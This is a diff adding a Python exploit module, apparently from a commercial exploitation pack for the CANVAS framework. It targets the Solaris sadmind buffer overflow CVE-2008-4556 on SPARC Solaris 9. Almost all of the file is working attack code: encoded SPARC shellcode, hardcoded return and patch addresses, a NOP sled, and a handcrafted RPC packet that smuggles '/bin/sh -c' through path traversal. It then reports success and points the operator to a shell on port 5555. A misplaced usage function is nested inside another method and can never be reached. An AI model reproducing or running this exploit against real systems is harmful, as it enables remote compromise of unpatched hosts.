@@ -1,0 +1,243 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import os,getopt
+import sys
+sys.path.append(".")
+sys.path.append("../../")
+
+import socket
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from sunrpc import *
+
+DOCUMENTATION={}
+DOCUMENTATION['VENDOR']="Sun Microsystems"
+DOCUMENTATION["Date public"]="2008-10-14"
+DOCUMENTATION["CERT Advisory"]=None
+DOCUMENTATION["Repeatability"]="Infinite"
+DOCUMENTATION["References"]="http://risesecurity.org/advisories/RISE-2008001.txt"
+DOCUMENTATION["CVE Name"]="CVE-2008-4556"
+DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4556"
+DOCUMENTATION["Notes"]=None
+
+PROPERTY={}
+PROPERTY['TYPE']="Exploit"
+PROPERTY['SITE']="Remote"
+PROPERTY['ARCH']=[ ["Solaris", "sparc"] ]
+PROPERTY["VERSION"]=["9"]
+
+DESCRIPTION = "Sun Solstice AdminSuite sadmind adm_build_path() Buffer Overflow Vulnerability"
+NAME = "Solaris sadmind Buffer Overflow Vulnerability"
+VERSION = "1.0"
+
+GTK2_DIALOG="dialog.glade2"
+
+SADMIND_PROGRAM = 100232
+SADMIND_PROTO = "udp"
+SADMIND_VERSION = 10
+SADMIND_PROCEDURE = 1
+
+targets = {}
+# TARGET[n] = [Name, patchaddr, retaddr]
+targets[0] = ["SunOS atlsun59 5.9 Generic_117171-07 sun4u sparc SUNW,Sun-Blade-100", 0xffbf83d8, 0xffbf88e0]
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.name = NAME        
+		self.port = 0
+		self.host = ""
+		self.attackhost = "localhost"
+
+		self.shellcode  = "\x23\x32\xde\xd7\xa2\x14\x62\x6f\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff"
+		self.shellcode += "\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20\xa2\x04\x40\x15\x81\xdb\xe0\x20"
+		self.shellcode += "\x12\xbf\xff\xfb\x9e\x03\xe0\x04\x57\x50\xfe\x68\xff\xb6\xde\x77\x69\xad\xde\x7c"
+		self.shellcode += "\x01\xcb\x1e\x89\xbb\xfc\xbe\x8f\x2b\xec\x9e\x8d\xce\x1c\xfe\x77\x5f\xcc\xdf\x7f"
+		self.shellcode += "\x8f\xce\xa0\x87\x11\x10\xdf\xf2\xf1\x04\xfe\x4f\x11\x06\xbe\x5f\x11\x6b\x7e\x6b"
+		self.shellcode += "\x03\x4f\x21\x83\xb7\x80\x01\xb3\x35\xb0\x61\x5b\xa8\x60\x42\x93\x1b\x83\x3d\x5b"
+		self.shellcode += "\x09\x94\x62\x9a\xaf\x84\x42\x75\x3e\x74\xa3\x8d\x91\x77\x1c\x75\x83\x62\x23\x8c"
+		self.shellcode += "\x37\x80\xe3\x87\xb5\xb4\xc3\x7d\x28\x65\x24\x89\x9b\xa6\x9b\x71\x8f\xb8\xc4\x82"
+		self.shellcode += "\x3d\xa9\x24\x8d\xd5\x6b\x84\x8c\x54\x7b\xe4\xb0\xc9\xab\xc4\xc4\xf8\xf3\xfb\x28"
+		self.shellcode += "\x2d\x0f\xbb\x28\x59\x15\x04\xc3\x40\x21\x5c\x49\x22\x22\x7c\x03\x01\x41\xa2\x01"
+		self.shellcode += "\xd5\x75\xfb\xa5\x47\x5a\x5b\xcd\x87\xa6\x24\x3d\x97\xfa\xe4\x45\xd7\xde\xa4\x49"
+		self.shellcode += "\x5a\x30\xfb\x8a\xcb\xe0\xdb\xe4\xec\x01\x1b\xf4"
+
+		return
+
+	def displayVersions(self):
+		""" display versions from TARGETS dict """
+
+		i = 0
+		for key in targets:
+			print "%d : %s"% (i, targets[key][0])
+			i += 1
+		return
+
+	def run(self):
+		self.host = self.target.interface
+		self.version = int(self.argsDict.get('version', self.version))
+
+		self.setInfo("%s attacking %s"%(NAME,self.host))
+
+		self.version_name, self.patchaddr, self.retaddr = targets[self.version]
+		self.log("[D2 LOG] Using target: %s" % self.version_name)
+
+		port = 0
+
+		if port == 0:
+			try:
+				self.log("[D2 LOG] Going to portmapper to find port...")
+				port = SRPCgetport(self.host, SADMIND_PROGRAM, SADMIND_VERSION, SADMIND_PROTO)
+				self.log("[D2 LOG] Portmapper query returned %d" % port)
+			except:
+				pass
+
+		if port == 0 or port == None:
+			self.log("[D2 LOG] Not able to automatically get the port.")
+			self.setInfo("%s attacking %s (failed)"%(NAME,self.host))
+			return 0
+
+		self.port = int(port)
+
+		try:
+			s = self.getudpsock()
+			s.connect((self.host, self.port))
+			s.send(self.makesploit())
+		except:
+			import traceback
+			traceback.print_exc(file=sys.stdout)
+			self.log("[D2 LOG] Attack reported no open socket or some othe error - service not available?")
+			self.setInfo("%s attacked %s:%d (failed)"%(NAME,self.host,self.port))
+			return 0
+     
+		s.close()
+
+		time.sleep(3)
+
+		self.log("[D2 LOG] Exploit succeded. Connect to %s:%d" % (self.host, 5555))
+		self.setInfo("%s attacking %s:%d (succeded)"%(NAME,self.host,self.port))
+		return 1
+    
+	def makesploit(self):
+		sploitstring = ""
+		packed_host = self.attackhost + ("\x00" * (59 - len(self.attackhost)))
+
+		sploitstring += SRPCCallHeaderUDP_UNIX(SADMIND_PROGRAM, SADMIND_VERSION, SADMIND_PROCEDURE, self.attackhost)
+		sploitstring += "\x49\x59\x62\x2f\x00\x07\x45\xdf"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04"
+
+		sploitstring += "\x7f\x00\x00\x01" # 127.0.0.1
+		sploitstring += "\x00\x01\x87\x88" # SADMIND
+
+		sploitstring += "\x00\x00\x00\x0a\x00\x00\x00\x04"
+
+		sploitstring += "\x7f\x00\x00\x01" # 127.0.0.1
+		sploitstring += "\x00\x01\x87\x88" # SADMIND
+
+		sploitstring += "\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x3b" + packed_host
+		sploitstring += "\x00\x00\x00\x00\x06" + "system"
+		sploitstring += "\x00\x00\x00\x00\x00\x15" + "../../../../../bin/sh" + "\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x0d\xa6" 
+
+		sploitstring += "\x00\x00\x00\x0e" + "ADM_FW_VERSION"
+		sploitstring += "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00"
+		sploitstring += "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x08" + "ADM_LANG"
+		sploitstring += "\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00"
+		sploitstring += "\x00\x01" + "C" 
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x0d" + "ADM_REQUESTID"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11"
+		sploitstring += "00009:000000000:0" + "\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x09" + "ADM_CLASS"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07"
+		sploitstring += "\x00\x00\x00\x06" + "system"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x0e" + "ADM_CLASS_VERS"
+		sploitstring += "\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04"
+		sploitstring += "\x00\x00\x00\x03" + "2.1"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x0a" + "ADM_METHOD"
+
+		sploitstring += "\x00\x00\x00\x00\x00\x09"
+
+		XX = "\x90" * (2050-len(self.shellcode)-500) + self.shellcode + "\x90\x90" + "\x90" * 500 + "CC" + struct.pack(">L", self.patchaddr) * 2 + struct.pack(">L", self.retaddr) * 100
+		while (len(XX) % 4 != 0):
+			XX += "\x00"
+	
+		sploitstring += struct.pack(">L", len(XX)+1) + struct.pack(">L", len(XX))
+		sploitstring += XX
+		
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x08" + "ADM_HOST"
+		sploitstring += "\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b" + packed_host
+
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x0f" + "ADM_CLIENT_HOST"
+		sploitstring += "\x00\x00\x00\x00\x09"
+		sploitstring += "\x00\x00\x00\x0a\x00\x00\x00\x09" + self.attackhost
+		
+		sploitstring += "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x11" + "ADM_CLIENT_DOMAIN"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x11" + "ADM_TIMEOUT_PARMS"
+		sploitstring += "\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x09\x00\x00\x00\x1c"
+		sploitstring += "\x00\x00\x00\x1b" + "TTL=0 PTO=20 PCNT=2 PDLY=30"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+		sploitstring += "\x00\x00\x00\x09" + "ADM_FENCE" 
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00"
+		sploitstring += "\x00\x00\x03\x00\x00\x00\x02" + "-c" 
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00"
+		sploitstring += "\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00"
+
+		sploitstring += "cmd" + ("\x00" * (512 - len("cmd")))
+
+		sploitstring += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"
+		sploitstring += "netmgt_endofargs"
+
+		return sploitstring
+
+		def usage(self):
+			print "Usage: "+sys.argv[0]+" -t target -v version [-O host:hostname] [-p port] [-O command:command]"
+
+			i = 0
+
+			print 'Available versions:'
+
+			for listline in targets.values():
+				print '\t%d: %s'%(i, listline[0])
+				i = i + 1
+
+			sys.exit()
+
+if __name__ == '__main__':
+    print "Running CANVAS "+NAME+" version "+VERSION
+    app = theexploit()
+    ret = standard_callback_commandline(app)
